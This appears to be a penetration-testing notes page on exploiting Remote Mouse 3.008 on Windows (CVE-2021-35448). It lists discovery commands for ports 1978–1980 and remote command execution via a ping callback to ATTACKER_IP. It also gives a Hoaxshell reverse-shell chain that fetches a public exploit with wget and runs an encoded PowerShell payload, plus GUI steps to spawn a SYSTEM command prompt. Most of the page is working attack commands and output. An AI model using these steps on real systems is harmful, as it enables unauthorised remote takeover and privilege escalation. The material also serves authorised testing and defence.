# Remote Mouse

Remote Mouse is Windows desktop control software. If it is installed and running, check both the exposed control ports and the local GUI attack surface.

## Discovery

Look for the process and listening ports:

```cmd
tasklist /svc | findstr /i RemoteMouse
netstat -ano | findstr /i "1978 1979 1980"
```

Common listeners:

```text
TCP    0.0.0.0:1978    0.0.0.0:0    LISTENING
TCP    0.0.0.0:1979    0.0.0.0:0    LISTENING
TCP    0.0.0.0:1980    0.0.0.0:0    LISTENING
UDP    0.0.0.0:1978    *:*
```

Map the PID back to the binary:

```powershell
Get-Process -Id <PID>
```

Scan externally if the host firewall allows it:

```bash
nmap -sT TARGET -p 1978,1979,1980
```

## Remote Mouse 3.008

Known public references:

- CVE-2021-35448
- https://www.exploit-db.com/exploits/50047
- https://www.exploit-db.com/exploits/50258
- https://github.com/p0dalirius/RemoteMouse-3.008-Exploit

### Network Command Execution

If TCP `1978` is reachable, Remote Mouse can be abused remotely to send keystrokes and execute commands.

Confirm command execution with ICMP first:

```bash
sudo tcpdump -i tun0 icmp
```

Modify the exploit command from `calc.exe` to a ping:

```python
SendString("ping -n 4 ATTACKER_IP", ip)
```

Run the Python 2 exploit:

```bash
python 46697.py TARGET
```

Expected output:

```text
('SUCCESS! Process calc.exe has run on target', 'TARGET')
```

Expected callback:

```text
IP TARGET > ATTACKER_IP: ICMP echo request
IP ATTACKER_IP > TARGET: ICMP echo reply
```

For a shell, Hoaxshell worked through the Python 3 exploit:

```bash
python3 hoaxshell.py -s ATTACKER_IP -p 80
wget https://raw.githubusercontent.com/p0dalirius/RemoteMouse-3.008-Exploit/refs/heads/master/RemoteMouse-3.008-Exploit.py
python3 RemoteMouse-3.008-Exploit.py -t TARGET -c "powershell -e ENCODED_HOAXSHELL_PAYLOAD"
```

Long encoded payloads are slow because the exploit types characters into the target. In the observed path, the delay was about half a second per character and the payload took several minutes to finish.

Successful shell:

```text
PS C:\Users\divine >
```

Check context:

```cmd
whoami /all
```

Useful indicators after shell access:

```text
RemoteMouseService.exe
RemoteMouseCore.exe
RemoteMouse.exe

TCP    0.0.0.0:1978    0.0.0.0:0    LISTENING
TCP    0.0.0.0:1979    0.0.0.0:0    LISTENING
TCP    0.0.0.0:1980    0.0.0.0:0    LISTENING
```

The remote control ports may be exploitable from the network, and the local GUI can also be abused from an RDP session. If RDP credentials are needed, check [FileZilla saved credentials](../windows-priv-esc/windows-credential-hunting.md#filezilla-saved-credentials).

### Local GUI Privilege Escalation

If Remote Mouse 3.008 is running in the tray:

1. Open Remote Mouse from the system tray.
2. Go to **Settings**.
3. Click **Change...** in the **Image Transfer Folder** section.
4. In the **Save As** prompt, enter `C:\Windows\System32\cmd.exe` in the address bar.
5. Press Enter. A command prompt can spawn in the elevated Remote Mouse context.

Check context immediately:

```cmd
whoami
# nt authority\system
```